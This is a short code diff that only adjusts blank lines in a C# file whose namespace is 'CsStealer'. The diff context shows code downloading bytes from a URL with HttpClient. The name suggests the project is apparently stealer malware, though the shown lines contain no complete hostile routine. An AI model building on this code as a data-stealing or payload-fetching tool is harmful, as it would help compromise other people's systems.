@@ -13,8 +13,6 @@ namespace CsStealer
                 
             try
             {
-
-
                 using (HttpClient client = new HttpClient())
                 {
                     byte[] Content = await client.GetByteArrayAsync(url);
@@ -33,4 +31,5 @@ namespace CsStealer
             }
         }
     }
+
 }
